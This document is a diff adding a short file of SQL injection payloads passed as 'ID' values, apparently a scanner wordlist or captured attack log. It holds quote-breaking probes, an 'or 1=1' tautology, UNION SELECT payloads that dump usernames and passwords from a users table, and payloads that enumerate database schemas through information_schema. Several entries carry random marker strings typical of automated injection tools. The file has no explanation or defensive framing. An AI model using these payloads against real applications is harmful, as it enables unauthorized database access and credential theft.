@@ -1,0 +1,16 @@
+ID:"' union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users),3 and '1'='1"
+ID:"" union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users),3 and '1'='1"
+ID:"" union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users),3 and "1"
+ID:"1"
+ID:"'"
+ID:"""
+ID:"1""
+ID:"1" or 1=1 -- "
+ID:-1 union select 1,2,concat('schemas:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat('BDKHqb11AK:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat('Liqj7uJnlL:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:"
+ID:'
+ID:-1 union select 1,2,concat('ARe35BrzNh:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat('SAuEGhq2uY:',group_concat(schema_name)) from information_schema.schemata -- 
+ID:-1 union select 1,2,concat('6mr17mkqoL:',group_concat(schema_name)) from information_schema.schemata -- 
